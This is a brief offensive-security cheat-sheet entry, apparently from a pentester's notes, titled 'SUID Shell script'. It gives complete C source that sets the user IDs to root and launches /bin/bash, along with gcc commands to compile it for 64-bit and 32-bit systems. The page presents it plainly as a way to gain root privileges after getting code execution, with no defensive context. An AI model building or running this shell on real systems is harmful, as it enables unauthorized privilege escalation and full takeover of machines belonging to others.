---
description: >-
  If  your able to run a executable to escalate privilege, you can use the
  following code to gain root privileges:
---

# SUID Shell script

code:

```text
int main(void){ 
    setresuid(0, 0, 0); 
    system("/bin/bash"); 
} 
```

Building the SUID Shell binary: 

`gcc -o suid suid.c`   

For 32 bit: 

`gcc -m32 -o suid suid.c`   

